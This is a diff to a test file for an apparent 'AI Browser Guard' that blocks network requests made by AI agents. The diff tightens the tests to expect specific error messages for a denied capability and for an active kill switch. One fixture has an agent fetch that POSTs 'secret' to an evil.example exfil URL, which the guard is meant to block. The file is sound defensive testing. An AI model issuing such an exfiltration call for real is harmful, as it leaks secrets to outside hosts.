@@ -110,7 +110,7 @@ describe('network egress deny (fetch)', () => {
     await setRule(networkBlockedRule());
     await expect(
       asAgent(() => window.fetch('https://evil.example/exfil', { method: 'POST', body: 'secret' }))
-    ).rejects.toThrow();
+    ).rejects.toThrow(/AI Browser Guard \(rule: Capability 'network-request' not permitted\)/);
   });
 
   it('lets the user\'s own fetch through under the same rule', async () => {
@@ -136,7 +136,7 @@ describe('network egress deny (fetch)', () => {
     await setKillSwitch(true);
     await expect(
       asAgent(() => window.fetch('https://api.example.com/ok'))
-    ).rejects.toThrow();
+    ).rejects.toThrow(/AI Browser Guard \(rule: Kill switch active/);
 
     // The user's own fetch is still allowed during the kill switch.
     const res = await window.fetch('https://api.example.com/ok');
